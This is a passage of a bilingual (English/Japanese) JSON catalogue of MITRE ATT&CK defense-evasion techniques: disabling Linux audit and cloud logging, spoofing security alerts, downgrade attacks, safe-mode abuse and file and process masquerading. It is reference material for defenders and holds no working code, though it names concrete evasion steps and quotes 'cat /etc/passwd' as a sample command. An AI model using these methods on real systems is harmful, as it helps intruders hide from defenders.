                        "description_eng": "Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.\n\nOften referred to as `auditd`, this is the name of the daemon used to write events to disk and is governed by the parameters set in the `audit.conf` configuration file. Two primary ways to configure the log generation rules are through the command line `auditctl` utility and the file `/etc/audit/audit.rules`,  containing a sequence of `auditctl` commands loaded at boot time.(Citation: Red Hat System Auditing)(Citation: IzyKnows auditd threat detection 2022)\n\nWith root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with `auditd` daemon or use `systemctl` to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the `/etc/audit/audit.rules` or `audit.conf` files to ignore malicious activity.(Citation: Trustwave Honeypot SkidMap 2023)(Citation: ESET Ebury Feb 2014)",
                        "description_jp": "攻撃者は、悪意のあるアクティビティを隠し、検出を回避するために、Linux監査システムを無効化または変更する可能性があります。Linux管理者は、Linux監査システムを使用して、システム上のセキュリティ関連情報を追跡します。Linux監査システムはカーネルレベルで動作し、事前構成されたルールに基づいて、プロセス、ネットワーク、ファイル、ログインイベントなどのアプリケーションおよびシステムアクティビティに関するイベントログを保持します。\n\nしばしば`auditd`と呼ばれるこれは、イベントをディスクに書き込むために使用されるデーモンの名前であり、`audit.conf`構成ファイルで設定されたパラメータによって管理されます。ログ生成ルールを構成する主な2つの方法は、コマンドラインユーティリティ`auditctl`と、起動時にロードされる`auditctl`コマンドのシーケンスを含むファイル`/etc/audit/audit.rules`です。(引用: Red Hat System Auditing)(引用: IzyKnows auditd threat detection 2022)\n\nルート権限があれば、攻撃者はAuditシステムサービスに関連するプロセスを強制終了するか、<code>systemctl</code>を使用してAuditサービスを停止することにより、Auditシステムサービスを無効にしたり、構成/ルールファイルを編集したり、Auditシステムライブラリ関数をフックしたりして、アクティビティがログに記録されないようにすることができます。攻撃者はまた、ロギングを無効にするためにAuditシステム関数をフックしたり、悪意のあるアクティビティを無視するように<code>/etc/audit/audit.rules</code>または<code>audit.conf</code>ファイルに含まれるルールを変更したりすることもできます。(引用: Trustwave Honeypot SkidMap 2023)(引用: ESET Ebury Feb 2014)"
                    },
                    {
                        "id": "T1562.011",
                        "name_eng": "Spoof Security Alerting",
                        "name_jp": "セキュリティアラートの偽装",
                        "description_eng": "Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders’ awareness of malicious activity.(Citation: BlackBasta) Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident.\n\nRather than or in addition to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (e.g., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)). An adversary can also present a “healthy” system status even after infection. This can be abused to enable further malicious activity by delaying defender responses.\n\nFor example, adversaries may show a fake Windows Security GUI and tray icon with a “healthy” system status after Windows Defender and other system tools have been disabled.(Citation: BlackBasta)",
                        "description_jp": "攻撃者は、ツールからのセキュリティアラートを偽装し、防御側の悪意のあるアクティビティに対する認識を損なうために偽の証拠を提示する可能性があります。(引用: BlackBasta) 防御ツールによって生成されるメッセージには、潜在的なセキュリティイベントに関する情報や、セキュリティソフトウェアおよびシステムの機能ステータスに関する情報が含まれています。セキュリティ報告メッセージは、システムの正常な動作を監視し、セキュリティインシデントを示す可能性のある重要なイベントを特定するために重要です。\n\n[インジケーターブロッキング](https://attack.mitre.org/techniques/T1562/006)の代わりに、またはそれに加えて、攻撃者は、正当なセキュリティツールが無効にされた後でも（例：[ツールの無効化または変更](https://attack.mitre.org/techniques/T1562/001)）、セキュリティツールが引き続き機能しているという肯定的な確認を偽装することができます。攻撃者はまた、感染後でも「健全な」システムステータスを提示することができます。これは、防御側の対応を遅らせることにより、さらなる悪意のあるアクティビティを可能にするために悪用される可能性があります。\n\n例えば、攻撃者は、Windows Defenderや他のシステムツールが無効にされた後、「健全な」システムステータスを持つ偽のWindowsセキュリティGUIとトレイアイコンを表示する可能性があります。(引用: BlackBasta)"
                    },
                    {
                        "id": "T1562.008",
                        "name_eng": "Disable or Modify Cloud Logs",
                        "name_jp": "クラウドログの無効化または変更",
                        "description_eng": "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality – for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user’s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)",
                        "description_jp": "攻撃者は、活動に関する収集データを制限し、検出を回避するために、クラウドログ機能と統合を無効化または変更する可能性があります。クラウド環境では、監査ログとアプリケーションログの収集と分析が可能であり、これによりユーザーが環境内でどのような活動を行っているかについての洞察が得られます。攻撃者が十分な権限を持っている場合、活動の検出を回避するためにログ記録を無効化または変更できます。\n\n例えば、AWSでは、敵対者はさらなる悪意のある活動を行う前にCloudWatch/CloudTrailの統合を無効にするかもしれない。(引用：Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) あるいは、関連するSNSトピックを削除したり、複数リージョンのロギングを無効にしたり、ログファイルを検証および/または暗号化する設定を無効にしたりするなど、ロギング機能を改ざんする可能性もある。(引用：AWS Update Trail)(引用：Pacu Detection Disruption Module) Office 365では、敵対者は<code>Set-MailboxAuditBypassAssociation</code>コマンドレットを使用したり、ユーザーのM365 Advanced Auditingを無効にしたり、ユーザーのライセンスをEnterprise E5からEnterprise E3ライセンスにダウングレードしたりすることで、特定のユーザーのメール収集活動のロギングを無効にするかもしれない。(引用：Dark Reading Microsoft 365 Attacks 2021)"
                    },
                    {
                        "id": "T1562.010",
                        "name_eng": "Downgrade Attack",
                        "name_jp": "ダウングレード攻撃",
                        "description_eng": "Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls. Downgrade attacks typically take advantage of a system’s backward compatibility to force it into less secure modes of operation. \n\nAdversaries may downgrade and use various less-secure versions of features of a system, such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s or even network protocols that can be abused to enable [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) or [Network Sniffing](https://attack.mitre.org/techniques/T1040).(Citation: Praetorian TLS Downgrade Attack 2014) For example, [PowerShell](https://attack.mitre.org/techniques/T1059/001) versions 5+ includes Script Block Logging (SBL), which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to [Impair Defenses](https://attack.mitre.org/techniques/T1562) while running malicious scripts that may have otherwise been detected.(Citation: CrowdStrike BGH Ransomware 2021)(Citation: Mandiant BYOL 2018)(Citation: att_def_ps_logging)\n\nAdversaries may similarly target network traffic to downgrade from an encrypted HTTPS connection to an unsecured HTTP connection that exposes network data in clear text.(Citation: Targeted SSL Stripping Attacks Are Real)(Citation: Crowdstrike Downgrade) On Windows systems, adversaries may downgrade the boot manager to a vulnerable version that bypasses Secure Boot, granting the ability to disable various operating system security mechanisms.(Citation: SafeBreach)",
                        "description_jp": "攻撃者は、時代遅れ、脆弱、および/または更新されたセキュリティ制御をサポートしていない可能性のあるシステム機能のバージョンをダウングレードまたは使用する可能性があります。ダウングレード攻撃は、通常、システムの下位互換性を利用して、より安全性の低い動作モードに強制します。\n\n攻撃者は、[コマンドおよびスクリプトインタプリタ](https://attack.mitre.org/techniques/T1059)や、[中間者攻撃](https://attack.mitre.org/techniques/T1557)や[ネットワークスニッフィング](https://attack.mitre.org/techniques/T1040)を可能にするために悪用される可能性のあるネットワークプロトコルなど、システムのさまざまな機能の安全性の低いバージョンをダウングレードして使用する可能性があります。(引用: Praetorian TLS Downgrade Attack 2014) 例えば、[PowerShell](https://attack.mitre.org/techniques/T1059/001)バージョン5以降にはスクリプトブロックロギング（SBL）が含まれており、実行されたスクリプトコンテンツを記録できます。しかし、攻撃者は、他の方法では検出された可能性のある悪意のあるスクリプトを実行中に[防御の阻害](https://attack.mitre.org/techniques/T1562)を意図して、SBLをサポートしていない以前のバージョンのPowerShellを実行しようとする可能性があります。(引用: CrowdStrike BGH Ransomware 2021)(引用: Mandiant BYOL 2018)(引用: att_def_ps_logging)\n\n敵対者は同様に、ネットワークトラフィックを標的にして、暗号化されたHTTPS接続から、ネットワークデータを平文で公開する安全でないHTTP接続にダウングレードする可能性がある(引用: Targeted SSL Stripping Attacks Are Real)(引用: Crowdstrike Downgrade)。Windowsシステムでは、敵対者はブートマネージャーを脆弱なバージョンにダウングレードしてセキュアブートをバイパスし、様々なオペレーティングシステムのセキュリティメカニズムを無効にする能力を得る可能性がある(引用: SafeBreach)。"
                    },
                    {
                        "id": "T1562.007",
                        "name_eng": "Disable or Modify Cloud Firewall",
                        "name_jp": "クラウドファイアウォールの無効化または変更",
                        "description_eng": "Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004). \n\nCloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary with appropriate permissions may introduce new firewall rules or policies to allow access into a victim cloud environment and/or move laterally from the cloud control plane to the data plane. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups (or creates new security groups entirely) to allow any TCP/IP connectivity to a cloud-hosted instance.(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022) They may also remove networking limitations to support traffic associated with malicious activity (such as cryptomining).(Citation: Expel IO Evil in AWS)(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)\n\nModifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. It may also be used to open up resources for [Brute Force](https://attack.mitre.org/techniques/T1110) or [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
                        "description_jp": "攻撃者は、クラウドリソースへのアクセスを制限する制御をバイパスするために、クラウド環境内のファイアウォールを無効化または変更する可能性があります。クラウドファイアウォールは、[システムファイアウォールの無効化または変更](https://attack.mitre.org/techniques/T1562/004)で説明されているシステムファイアウォールとは異なります。\n\nクラウド環境は通常、予想されるポートとプロトコルを介して信頼できるIPアドレスからのネットワークアクティビティのみを許可する制限的なセキュリティグループとファイアウォールルールを利用します。適切な権限を持つ攻撃者は、被害者のクラウド環境へのアクセスを許可したり、クラウドコントロールプレーンからデータプレーンに横方向に移動したりするために、新しいファイアウォールルールまたはポリシーを導入する可能性があります。例えば、攻撃者は、既存のセキュリティグループに新しいイングレスルールを作成する（または完全に新しいセキュリティグループを作成する）スクリプトまたはユーティリティを使用して、クラウドホスト型インスタンスへの任意のTCP/IP接続を許可する可能性があります。(引用: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022) また、悪意のあるアクティビティ（クリプトマイニングなど）に関連するトラフィックをサポートするために、ネットワーク制限を削除する可能性もあります。(引用: Expel IO Evil in AWS)(引用: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)\n\nクラウドファイアウォールを変更または無効にすると、他の方法では許可されない攻撃者のC2通信、横方向の移動、および/またはデータ持ち出しが可能になる場合があります。また、[ブルートフォース](https://attack.mitre.org/techniques/T1110)または[エンドポイントサービス拒否](https://attack.mitre.org/techniques/T1499)のためにリソースを開放するために使用される場合もあります。"
                    },
                    {
                        "id": "T1562.009",
                        "name_eng": "Safe Mode Boot",
                        "name_jp": "セーフモードブート",
                        "description_eng": "Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.(Citation: Microsoft Safe Mode)(Citation: Sophos Snatch Ransomware 2019)\n\nAdversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.(Citation: Microsoft bcdedit 2021)\n\nAdversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)). Malicious [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) objects may also be registered and loaded in safe mode.(Citation: Sophos Snatch Ransomware 2019)(Citation: CyberArk Labs Safe Mode 2016)(Citation: Cybereason Nocturnus MedusaLocker 2020)(Citation: BleepingComputer REvil 2021)",
                        "description_jp": "攻撃者はWindowsのセーフモードを悪用してエンドポイントの防御を無効にする可能性があります。セーフモードは、限られたドライバとサービスのセットでWindowsオペレーティングシステムを起動します。エンドポイント検出応答（EDR）ツールなどのサードパーティ製セキュリティソフトウェアは、セーフモードでWindowsを起動した後は起動しない場合があります。セーフモードには、セーフモードとセーフモード（ネットワーク対応）の2つのバージョンがあります。セーフモード起動後に他のサービスを開始することも可能です。(引用: Microsoft Safe Mode)(引用: Sophos Snatch Ransomware 2019)\n\n攻撃者は、限定的な起動では開始されない可能性のあるエンドポイント防御を無効にするためにセーフモードを悪用する可能性があります。ホストは、ブートアプリケーション設定を管理するファイルであるブート構成データ（BCD）ストアを変更することにより、次の再起動後にセーフモードに強制的に移行させることができます。(引用: Microsoft bcdedit 2021)\n\n攻撃者はまた、関連するレジストリ値を変更することにより（つまり、[レジストリの変更](https://attack.mitre.org/techniques/T1112)）、セーフモードで起動する最小限のサービスのリストに悪意のあるアプリケーションを追加する可能性があります。悪意のある[コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1559/001)（COM）オブジェクトも、セーフモードで登録およびロードされる可能性があります。(引用: Sophos Snatch Ransomware 2019)(引用: CyberArk Labs Safe Mode 2016)(引用: Cybereason Nocturnus MedusaLocker 2020)(引用: BleepingComputer REvil 2021)"
                    }
                ]
            },
            {
                "id": "T1036",
                "name_eng": "Masquerading",
                "name_jp": "マスカレード",
                "description_eng": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",
                "description_jp": "攻撃者は、アーティファクトの機能を操作して、ユーザーやセキュリティツールに対して正当または無害に見せかけようとする可能性があります。マスカレードは、防御や監視を回避するために、正当か悪意のあるかにかかわらず、オブジェクトの名前や場所が操作されたり悪用されたりする場合に発生します。これには、ファイルメタデータの操作、ユーザーを騙してファイルタイプを誤認させること、正当なタスクやサービス名を与えることなどが含まれる場合があります。\n\nセキュリティ監視を回避するために悪用可能なシステムユーティリティの名前を変更することも、[マスカレード](https://attack.mitre.org/techniques/T1036)の一形態です。(引用：LOLBASメインサイト)",
                "subtechniques": [
                    {
                        "id": "T1036.008",
                        "name_eng": "Masquerade File Type",
                        "name_jp": "ファイルタイプの偽装",
                        "description_eng": "Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file’s signature, extension, icon, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file’s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file’s type. For example, the header of a JPEG file,  is <code> 0xFF 0xD8</code> and the file extension is either `.JPE`, `.JPEG` or `.JPG`. \n\nAdversaries may edit the header’s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and stored (e.g., [Upload Malware](https://attack.mitre.org/techniques/T1608/001)) so that adversaries may move their malware without triggering detections. \n\nCommon non-executable file types and extensions, such as text files (`.txt`) and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of <code>test.gif</code>. A user may not know that a file is malicious due to the benign appearance and file extension.\n\nPolygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.(Citation: polygot_icedID)",
                        "description_jp": "攻撃者は、ペイロードのフォーマット（ファイルの署名、拡張子、アイコン、内容など）を変更することで、悪意のあるペイロードを正当なファイルに見せかける可能性があります。さまざまなファイルタイプには、エンコード方法や構成方法など、典型的な標準フォーマットがあります。例えば、ファイルの署名（ヘッダーまたはマジックバイトとも呼ばれる）はファイルの先頭バイトであり、ファイルのタイプを識別するためによく使用されます。例えば、JPEGファイルのヘッダーは<code>0xFF 0xD8</code>で、ファイル拡張子は<code>.JPE</code>、<code>.JPEG</code>、または<code>.JPG</code>のいずれかです。\n\n攻撃者は、ファイル検証チェックや入力サニタイズをバイパスするために、悪意のあるペイロードのヘッダーの16進コードやファイル拡張子を編集する可能性があります。この動作は、攻撃者が検出をトリガーせずにマルウェアを移動できるようにするために、ペイロードファイルが転送される（例：[イングレスツール転送](https://attack.mitre.org/techniques/T1105)）および保存される（例：[マルウェアのアップロード](https://attack.mitre.org/techniques/T1608/001)）ときに一般的に使用されます。\n\nテキストファイル（`.txt`）や画像ファイル（`.jpg`、`.gif`など）のような一般的な非実行可能ファイルタイプと拡張子は、通常、良性のものとして扱われます。これに基づいて、攻撃者はファイル拡張子を使用してマルウェアを偽装する可能性があり、例えばPHPバックドアコードに<code>test.gif</code>というファイル名を付けるなどです。ユーザーは、良性の外観とファイル拡張子のためにファイルが悪意のあるものであることを知らない可能性があります。\n\nポリグロットファイルは、複数の異なるファイルタイプを持ち、それらを実行するアプリケーションに基づいて異なる動作をするファイルであり、悪意のあるマルウェアや機能を偽装するためにも使用される可能性があります。(引用: polygot_icedID)"
                    },
                    {
                        "id": "T1036.003",
                        "name_eng": "Rename Legitimate Utilities",
                        "name_jp": "正当なユーティリティの名前変更",
                        "description_eng": "Adversaries may rename legitimate / system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for legitimate utilities adversaries are capable of abusing, including both built-in binaries and tools such as PSExec, AutoHotKey, and IronPython.(Citation: LOLBAS Main Site)(Citation: Huntress Python Malware 2025)(Citation: The DFIR Report AutoHotKey 2023)(Citation: Splunk Detect Renamed PSExec) It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>).(Citation: Elastic Masquerade Ball) An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on these utilities executing from non-standard paths.(Citation: F-Secure CozyDuke)",
                        "description_jp": "攻撃者は、これらのユーティリティの使用に関するセキュリティメカニズムを回避するために、正当な/システムユーティリティの名前を変更する可能性があります。組み込みのバイナリや、PSExec、AutoHotKey、IronPythonなどのツールを含む、攻撃者が悪用できる正当なユーティリティに対して、セキュリティ監視および制御メカニズムが導入されている場合があります。(引用: LOLBAS Main Site)(引用: Huntress Python Malware 2025)(引用: The DFIR Report AutoHotKey 2023)(引用: Splunk Detect Renamed PSExec) 利用前にユーティリティの名前を変更することにより（例：<code>rundll32.exe</code>の名前を変更）、これらのセキュリティメカニズムをバイパスできる可能性があります。(引用: Elastic Masquerade Ball) 正当なユーティリティが別のディレクトリにコピーまたは移動され、これらのユーティリティが非標準パスから実行されることに基づく検出を回避するために名前が変更されるという代替ケースが発生します。(引用: F-Secure CozyDuke)"
                    },
                    {
                        "id": "T1036.006",
                        "name_eng": "Space after Filename",
                        "name_jp": "ファイル名の後のスペース",
                        "description_eng": "Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.\n\nFor example, if there is a Mach-O executable file called <code>evil.bin</code>, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to <code>evil.txt</code>, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to <code>evil.txt </code> (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back).\n\nAdversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.",
                        "description_jp": "攻撃者は、ファイルの拡張子を変更することで、プログラムの真のファイルタイプを隠すことができます。特定のファイルタイプ（特に.app拡張子では機能しません）では、ファイル名の末尾にスペースを追加すると、オペレーティングシステムによるファイルの処理方法が変わります。\n\n例えば、<code>evil.bin</code>というMach-O実行可能ファイルがある場合、ユーザーがダブルクリックするとTerminal.appが起動して実行されます。このファイルの名前を<code>evil.txt</code>に変更すると、ユーザーがダブルクリックしたときにデフォルトのテキスト編集アプリケーションで起動します（バイナリは実行されません）。しかし、ファイルの名前を<code>evil.txt </code>（末尾にスペースがあることに注意）に変更すると、ユーザーがダブルクリックしたときにOSによって真のファイルタイプが決定されて適切に処理され、バイナリが実行されます。(引用: Mac Backdoors are back)\n\n攻撃者はこの機能を使用して、ユーザーを騙して任意の形式の無害に見えるファイルをクリックさせ、最終的に悪意のあるものを実行させることができます。"
                    },
                    {
                        "id": "T1036.004",
                        "name_eng": "Masquerade Task or Service",
                        "name_jp": "タスクまたはサービスの偽装",
                        "description_eng": "Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis)",
                        "description_jp": "攻撃者は、タスクやサービスの名前を操作して、正当または無害に見せかけようとする可能性があります。タスクスケジューラやsystemdによって実行されるタスク/サービスには、通常、名前や説明が付与されます。(引用: TechNet Schtasks)(引用: Systemd Service Units) Windowsサービスには、サービス名と表示名があります。一般的に関連付けられている名前を持つ多くの無害なタスクやサービスが存在します。攻撃者は、タスクやサービスに正当なものと類似または同一の名前を付ける可能性があります。\n\nタスクやサービスには、説明など、攻撃者が正当に見せかけようとする可能性のある他のフィールドが含まれています。(引用: Palo Alto Shamoon Nov 2016)(引用: Fysbis Dr Web Analysis)"
                    },
                    {
                        "id": "T1036.002",
                        "name_eng": "Right-to-Left Override",
                        "name_jp": "右から左へのオーバーライド",
                        "description_eng": "Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named <code>March 25 \\u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>.(Citation: Infosecinstitute RTLO Technique)\n\nAdversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)/[Malicious File](https://attack.mitre.org/techniques/T1204/002) since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.",
                        "description_jp": "攻撃者は、右から左へのオーバーライド（RTLOまたはRLO）文字（U+202E）を悪用して、文字列やファイル名を偽装し、無害に見せかける可能性があります。RTLOは、それに続くテキストを逆順に表示させる非表示のUnicode文字です。例えば、<code>March 25 \\u202Excod.scr</code>という名前のWindowsスクリーンセーバー実行可能ファイルは、<code>March 25 rcs.docx</code>と表示されます。<code>photo_high_re\\u202Egnp.js</code>という名前のJavaScriptファイルは、<code>photo_high_resj.png</code>と表示されます。(引用: Infosecinstitute RTLO Technique)\n\n攻撃者は、ユーザーを騙して無害なファイルタイプだと思わせて実行させる手段として、RTLO文字を悪用する可能性があります。このテクニックの一般的な使用法は、[スピアフィッシング添付ファイル](https://attack.mitre.org/techniques/T1566/001)/[悪意のあるファイル](https://attack.mitre.org/techniques/T1204/002)です。なぜなら、ツールがRTLO文字をどのように表示・レンダリングするかを知らない場合、エンドユーザーと防御者の両方を騙すことができるからです。RTLO文字の使用は、多くの標的型侵入攻撃や犯罪行為で見られています。(引用: Trend Micro PLEAD RTLO)(引用: Kaspersky RTLO Cyber Crime) RTLOはWindowsレジストリでも使用でき、regedit.exeは反転した文字を表示しますが、コマンドラインツールreg.exeはデフォルトでは表示しません。"
                    },
                    {
                        "id": "T1036.005",
                        "name_eng": "Match Legitimate Resource Name or Location",
                        "name_jp": "正当なリソース名または場所との一致",
                        "description_eng": "Adversaries may match or approximate the name or location of legitimate files, Registry keys, or other resources when naming/placing them. This is done for the sake of evading defenses and observation. \n\nThis may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: `svchost.exe`). Alternatively, a Windows Registry key may be given a close approximation to a key used by a legitimate program. In containerized environments, a threat actor may create a resource in a trusted namespace or one that matches the naming convention of a container pod or cluster.(Citation: Aquasec Kubernetes Backdoor 2023)",
                        "description_jp": "攻撃者は、ファイル、レジストリキー、またはその他のリソースに名前を付けたり配置したりする際に、正当なものの名前や場所と一致させたり近似させたりする可能性があります。これは、防御や監視を回避するために行われます。\n\nこれは、実行可能ファイルを一般的に信頼されているディレクトリ（例：System32配下）に配置したり、正当で信頼されているプログラムの名前（例：`svchost.exe`）を付けたりすることによって行われる場合があります。あるいは、Windowsレジストリキーに、正当なプログラムが使用するキーに近い近似値が与えられる場合もあります。コンテナ化された環境では、脅威アクターは信頼された名前空間またはコンテナポッドやクラスターの命名規則に一致する名前空間にリソースを作成する可能性があります。(引用: Aquasec Kubernetes Backdoor 2023)"
                    },
                    {
                        "id": "T1036.011",
                        "name_eng": "Overwrite Process Arguments",
                        "name_jp": "プロセス引数の上書き",
                        "description_eng": "Adversaries may modify a process's in-memory arguments to change its name in order to appear as a legitimate or benign process. On Linux, the operating system stores command-line arguments in the process’s stack and passes them to the `main()` function as the `argv` array. The first element, `argv[0]`, typically contains the process name or path - by default, the command used to actually start the process (e.g., `cat /etc/passwd`). By default, the Linux `/proc` filesystem uses this value to represent the process name. The `/proc/<PID>/cmdline` file reflects the contents of this memory, and tools like `ps` use it to display process information. Since arguments are stored in user-space memory at launch, this modification can be performed without elevated privileges. \n\nDuring runtime, adversaries can erase the memory used by all command-line arguments for a process, overwriting each argument string with null bytes. This removes evidence of how the process was originally launched. They can then write a spoofed string into the memory region previously occupied by `argv[0]` to mimic a benign command, such as `cat resolv.conf`. The new command-line string is reflected in `/proc/<PID>/cmdline` and displayed by tools like `ps`.(Citation: Sandfly BPFDoor 2022)(Citation: Microsoft XorDdos Linux Stealth 2022)",
                        "description_jp": "敵対者は、プロセスのメモリ内引数を変更して、正当または無害なプロセスに見えるように名前を変更する可能性があります。Linuxでは、オペレーティングシステムはコマンドライン引数をプロセスのスタックに格納し、`argv`配列として`main()`関数に渡します。最初の要素である`argv[0]`には、通常、プロセス名またはパスが含まれます。デフォルトでは、実際にプロセスを開始するために使用されたコマンド（例：`cat /etc/passwd`）です。デフォルトでは、Linuxの`/proc`ファイルシステムはこの値を使用してプロセス名を表します。`/proc/<PID>/cmdline`ファイルはこのメモリの内容を反映し、`ps`のようなツールはそれを使用してプロセス情報を表示します。引数は起動時にユーザースペースメモリに格納されるため、この変更は昇格された権限なしで実行できます。\n\n実行時、攻撃者はプロセスのすべてのコマンドライン引数で使用されるメモリを消去し、各引数文字列をヌルバイトで上書きすることができます。これにより、プロセスが最初にどのように起動されたかの証拠が削除されます。その後、以前`argv[0]`が占有していたメモリ領域に偽装文字列を書き込み、`cat resolv.conf`のような無害なコマンドを模倣することができます。新しいコマンドライン文字列は`/proc/<PID>/cmdline`に反映され、`ps`のようなツールで表示されます。(引用: Sandfly BPFDoor 2022)(引用: Microsoft XorDdos Linux Stealth 2022)"
                    },
                    {
                        "id": "T1036.007",
                        "name_eng": "Double File Extension",
                        "name_jp": "二重ファイル拡張子",
                        "description_eng": "Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system’s policies.(Citation: PCMag DoubleExtension)(Citation: SOCPrime DoubleExtension) \n\nAdversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain [Initial Access](https://attack.mitre.org/tactics/TA0001) into a user’s system via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) then [User Execution](https://attack.mitre.org/techniques/T1204). For example, an executable file attachment named <code>Evil.txt.exe</code> may display as <code>Evil.txt</code> to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.(Citation: SOCPrime DoubleExtension)\n\nCommon 